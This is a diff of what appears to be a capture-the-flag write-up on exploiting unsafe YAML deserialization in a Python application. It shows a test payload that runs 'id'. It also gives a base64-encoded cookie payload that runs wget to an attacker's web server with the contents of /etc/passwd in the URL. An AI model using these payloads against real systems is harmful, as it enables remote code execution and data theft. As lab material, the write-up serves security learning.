@@ -18,4 +18,11 @@ basiclly nothing, but when you think about it it makes sense ofcourse it has som
 so look up `YAMl Deserialization` its a YAML RCE.
 
 I found an intereseting payload `yaml: !!python/object/apply:subprocess.check_output ['id']` and it worked
-but 
+but there is a problem the flag is in `/etc/passwd` and this payload doesn't accept spaces.
+
+so a friend gave me a link `https://xerosecurity.com/wordpress/exploiting-python-deserialization-vulnerabilities/`.
+
+## Solution
+Run a web server with `python3 -m http.server`.
+
+Payload: `Imdvb2RieWUiOiAhIXB5dGhvbi9vYmplY3QvYXBwbHk6b3Muc3lzdGVtIFsid2dldCBodHRwOi8veW91ci13ZWItc2VydmVyLWlwLz9gY2F0IC9ldGMvcGFzc3dkYCJd` (decode it to know the answer and put your data and decode it again and input it as a cookie)
